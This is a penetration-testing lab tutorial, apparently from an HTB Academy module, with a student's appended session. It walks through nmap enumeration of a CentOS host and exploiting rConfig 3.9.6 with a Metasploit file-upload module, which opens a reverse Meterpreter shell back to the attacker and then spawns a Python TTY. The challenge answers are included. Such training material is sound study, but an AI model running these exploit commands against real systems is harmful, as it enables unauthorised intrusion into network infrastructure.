Infiltrating Unix/Linux

W3Techs maintains an ongoing OS usage statistics study. This study reports that over 70% of websites (webservers) run on a Unix-based system. For us, this means we can significantly benefit from continuing to grow our knowledge of Unix/Linux and how we can gain shell sessions on these environments to potentially pivot further within an environment. While it is common for organizations to use 3rd parties & cloud providers to host their websites & web apps, many organizations still host their websites & web applications on servers in their network environments (on-prem). In these cases, we would want to establish a shell session with the underlying system to attempt to pivot to other systems on the internal network.
Common Considerations

As you may very well have noticed by now, gaining a shell session with a system can be done in various ways, one common way is through a vulnerability in an application. We will identify a vulnerability and discover an exploit that we can use to gain a shell by delivering a payload. When considering how we will establish a shell session on a Unix/Linux system, we will benefit from considering the following:

    What distribution of Linux is the system running?
    What shell & programming languages exist on the system?
    What function is the system serving for the network environment it is on?
    What application is the system hosting?
    Are there any known vulnerabilities?

Let's dive deeper into this concept by attacking a vulnerable application hosted on a Linux system. Keep the questions in mind and take notes as we go through this. Can you answer them?
Gaining a Shell Through Attacking a Vulnerable Application

As in most engagements, we will start with an initial enumeration of the system using Nmap.
Enumerate the Host

        shellsession
Leviathan516x@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)

Keeping our goal of gaining a shell session in mind, we must establish some next steps after examining our scan output.

What information could we gather from the output?

Considering we can see the system is listening on ports 80 (HTTP), 443 (HTTPS), 3306 (MySQL), and 21 (FTP), it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack (Apache 2.4.6 and PHP 7.2.34 ) and the distribution of Linux running on the system (CentOS). Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible.
rConfig Management Tool

The image shows the rConfig Configuration Management login page with fields for username and password, a "Remember me" checkbox, and a "Forgot my password?" link. The rConfig logo is displayed on the right.

Here we discover a network configuration management tool called rConfig. This application is used by network & system administrators to automate the process of configuring network appliances. One practical use case would be to use rConfig to remotely configure network interfaces with IP addressing information on multiple routers simultaneously. This tool saves admins time but, if compromised, could be used to pivot onto critical network devices that switch & route packets across the network. A malicious attacker could own the entire network through rConfig since it will likely have admin access to all the network appliances used to configure. As pentesters, finding a vulnerability in this application would be considered a very critical discovery.
Discovering a Vulnerability in rConfig

Take a close look at the bottom of the web login page, and we can see the rConfig version number (3.9.6). We should use this information to start looking for any CVEs, publicly available exploits, and proof of concepts (PoCs). As we research, be sure to look closely at what we find and understand what it is doing. We, of course, want it to lead us to a shell session with the target.

Using your search engine of choice will turn up some promising results. We can use the keywords: rConfig 3.9.6 vulnerability.

The image shows a Google search results page for "rconfig 3.9.6 vulnerability." The top results include links to exploit-db.com and mageni.net, discussing arbitrary file upload to remote code execution and multiple vulnerabilities in rConfig 3.9.6.

We can see that it may be worthwhile to choose this as the main focus of our research. The same thinking could be applied to the Apache and PHP versions, but since the application is running on the web stack, let's see if we can gain a shell through an exploit written for the vulnerabilities found in rConfig.

We can also use Metasploit's search functionality to see if any exploit modules can get us a shell session on the target.
Search For an Exploit Module

        shellsession
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution

One detail that can be overlooked when relying on MSF to find an exploit module for a specific application is the version of MSF. There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their repos on github. We could do an even more specific search using a search engine: rConfig 3.9.6 exploit metasploit github

This search can point us to the source code for an exploit module called rconfig_vendors_auth_file_upload_rce.rb. This exploit can get us a shell session on a target Linux box running rConfig 3.9.6. If this exploit did not show up in the MSF search, we can copy the code from this repo onto our local attack box and save it in the directory that our local install of MSF is referencing. To do this, we can issue this command on our attack box:
Locate

        shellsession
Leviathan516x@htb[/htb]$ locate exploits

We want to look for the directories in the output associated with Metasploit Framework. On Pwnbox, Metasploit exploit modules are kept in:

/usr/share/metasploit-framework/modules/exploits

We can copy the code into a file and save it in /usr/share/metasploit-framework/modules/exploits/linux/http similar to where they are storing the code in the GitHub repo. We should also keep msf up to date using the commands apt update; apt install metasploit-framework or your local package manager. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has .rb as the extension. All modules in MSF are written in Ruby.
Using the rConfig Exploit and Gaining a Shell

In msfconsole, we can manually load the exploit using the command:
Select an Exploit

        shellsession
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

With this exploit selected, we can list the options, input the proper settings specific to our network environment, and launch the exploit.
Use what you have learned in the module thus far to fill out the options associated with the exploit.
Execute the Exploit

        shellsession
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg

We can see from the steps outlined in the exploitation process that this exploit:

    Checks for the vulnerable version of rConfig
    Authenticates with the rConfig web login
    Uploads a PHP-based payload for a reverse shell connection
    Deletes the payload
    Leaves us with a Meterpreter shell session

Interact With the Shell

        shellsession

meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg

We can drop into a system shell (shell) to gain access to the target system as if we were logged in and open a terminal.
Spawning a TTY Shell with Python

When we drop into the system shell, we notice that no prompt is present, yet we can still issue some system commands. This is a shell typically referred to as a non-tty shell. These shells have limited functionality and can often prevent our use of essential commands like su (switch user) and sudo (super user do), which we will likely need if we seek to escalate privileges. This happened because the payload was executed on the target by the apache user. Our session is established as the apache user. Normally, admins are not accessing the system as the apache user, so there is no need for a shell interpreter language to be defined in the environment variables associated with apache.

We can manually spawn a TTY shell using Python if it is present on the system. We can always check for Python's presence on Linux systems by typing the command: which python. To spawn the TTY shell session using Python, we type the following command:
Interactive Python

        shellsession
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache

This command uses python to import the pty module, then uses the pty.spawn function to execute the bourne shell binary (/bin/sh). We now have a prompt (sh-4.2$) and access to more system commands to move about the system as we please.

Now, let's test our knowledge with some challenge questions.

Target:
10.129.16.14

What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?
        PHP

Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.
        edgerouter-isp

┌─[leviathan@parrot]─[~]
└──╼ $sudo nmap 10.129.16.14 --script vuln
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-02 12:40 PDT
Nmap scan report for 10.129.16.14
Host is up (0.076s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /README: Interesting, a readme.
|   /icons/: Potentially interesting folder w/ directory listing
|_  /install/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-trace: TRACE is enabled
111/tcp  open  rpcbind
443/tcp  open  https
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-cookie-flags: 
|   /login.php: 
|     PHPSESSID: 
|       secure flag not set and HTTPS in use
|_      httponly flag not set
|_http-trace: TRACE is enabled
| http-enum: 
|   /login.php: Possible admin folder
|   /README: Interesting, a readme.
|   /icons/: Potentially interesting folder w/ directory listing
|_  /install/: Potentially interesting folder
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
3306/tcp open  mysql

┌─[✗]─[leviathan@parrot]─[~]
└──╼ $msfconsole
[msf](Jobs:0 Agents:0) >> search rconfig

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   exploit/multi/http/solr_velocity_rce                     2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1     \_ target: Java (in-memory)                            .                .          .      .
   2     \_ target: Unix (in-memory)                            .                .          .      .
   3     \_ target: Linux (dropper)                             .                .          .      .
   4     \_ target: x86/x64 Windows PowerShell                  .                .          .      .
   5     \_ target: x86/x64 Windows CmdStager                   .                .          .      .
   6     \_ target: Windows Exec                                .                .          .      .
   7   exploit/multi/http/flowise_js_rce                        2025-09-13       excellent  Yes    Flowise JS Injection RCE
   8     \_ target: Unix/Linux Command                          .                .          .      .
   9     \_ target: Windows Command                             .                .          .      .
   10  auxiliary/gather/nuuo_cms_file_download                  2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   11  exploit/linux/http/rconfig_ajaxarchivefiles_rce          2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   12  exploit/linux/http/rconfig_vendors_auth_file_upload_rce  2021-03-17       excellent  Yes    rConfig Vendors Auth File Upload RCE
   13  exploit/unix/webapp/rconfig_install_cmd_exec             2019-10-28       excellent  Yes    rConfig install Command Execution
   14    \_ target: Automatic (Unix In-Memory)                  .                .          .      .
   15    \_ target: Automatic (Linux Dropper)                   .                .          .      .

[msf](Jobs:0 Agents:0) >> use 12
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> options

[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set rhost 10.129.16.14
rhost => 10.129.16.14
[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set lhost 10.10.14.54
lhost => 10.10.14.54
[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> run
[*] Started reverse TCP handler on 10.10.14.54:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'yjeobbfcfzj.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (45739 bytes) to 10.129.16.14
[+] Deleted yjeobbfcfzj.php
[*] Meterpreter session 1 opened (10.10.14.54:4444 -> 10.129.16.14:50144) at 2026-06-02 12:49:28 -0700

(Meterpreter 1)(/home/rconfig/www/images/vendor) >
(Meterpreter 1)(/home/rconfig/www/images/vendor) > shell
Process 2791 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
hostname
localhost.localdomain
dir devicedetails
dir: cannot access devicedetails: No such file or directory
cd 
/bin/sh: line 4: cd: HOME not set
cd /home 
ls
htb-student
install.log
rconfig
rconfig-3.9.6.zip
cd devicedetails
/bin/sh: line 7: cd: devicedetails: No such file or directory
ls
htb-student
install.log
rconfig
rconfig-3.9.6.zip
cd ht	
/bin/sh: line 9: cd: ht: No such file or directory
cd htb-student
/bin/sh: line 10: cd: htb-student: Permission denied
cd /devicedetails
ls
edgerouter-isp.yml
hostnameinfo.txt
type hostnameinfo.txt
/bin/sh: line 13: type: hostnameinfo.txt: not found
cat hostnameinfo.txt
Note: 

All yaml (.yml) files should be named after the hostname of the router or switch they will configure. We discussed this in our meeting back in January. Ask Bob about it. 
cat edgerouter-isp.yml
me: configure top level configuration
  cisco.ios.ios_config:
    lines: hostname edgerouter-isp

- name: configure interface settings
  cisco.ios.ios_config:
    lines:
    - description test interface
    - ip address 192.168.0.10 255.255.255.0
    parents: interface gigabitethernet0/0

- name: configure ip helpers on multiple interfaces
  cisco.ios.ios_config:
    lines:
    - ip helper-address 10.10.10.15
    - ip helper-address 10.10.11.12
    parents: '{{ item }}'
  with_items:
  - interface Ethernet1
  - interface Ethernet2
  - interface GigabitEthernet1












